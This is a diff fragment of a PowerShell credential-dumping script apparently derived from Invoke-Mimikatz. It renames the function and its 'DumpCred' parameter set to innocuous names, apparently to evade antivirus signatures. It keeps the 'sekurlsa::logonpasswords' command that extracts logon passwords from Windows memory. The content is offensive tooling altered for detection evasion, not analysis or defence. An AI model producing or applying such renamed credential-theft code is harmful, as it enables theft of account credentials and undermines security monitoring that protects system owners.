@@ -1,16 +1,16 @@
-function Invoke-Mimidogz
+function Invoke-Mastercats
 {
 
 
-[CmdletBinding(DefaultParameterSetName="DumpCred")]
+[CmdletBinding(DefaultParameterSetName="DumpStuff")]
 Param(
 	[Parameter(Position = 0)]
 	[String[]]
 	$ComputerName,
 
-    [Parameter(ParameterSetName = "DumpCred", Position = 1)]
+    [Parameter(ParameterSetName = "DumpStuff", Position = 1)]
     [Switch]
-    $DumpCred,
+    $DumpStuff,
 
     [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
     [Switch]
@@ -2644,7 +2644,7 @@ Function Main
 	Write-Verbose "PowerShell ProcessID: $PID"
 	
 
-	if ($PsCmdlet.ParameterSetName -ieq "DumpCred")
+	if ($PsCmdlet.ParameterSetName -ieq "DumpStuff")
 	{
 		$ExeArgs = "sekurlsa::logonpasswords exit"
 	}
